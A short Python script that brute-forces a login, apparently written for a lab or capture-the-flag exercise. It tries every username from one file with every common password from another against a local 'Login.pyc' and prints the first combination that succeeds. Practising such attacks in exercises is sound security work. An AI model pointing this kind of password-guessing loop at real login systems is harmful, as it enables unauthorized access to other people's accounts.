import time
import subprocess

start = time.time()
print("Start time: 0 seconds")


Gang = open("gang", "r")
usernames = []
for name in Gang:
    usernames.append(name.strip())  

MostCommonPWs = open("MostCommonPWs", "r")
passwords = []
for words in MostCommonPWs:
    passwords.append(words.strip())  


for username in usernames:
    for password in passwords:
        result = subprocess.run(["python3", "Login.pyc", username, password], capture_output=True, text=True)

        if "successful" in result.stdout:  
            print(f"Login successful! Username: {username}, Password: {password}")
            break  

end = time.time() - start
print(f"End Time: {end:.2f} seconds")
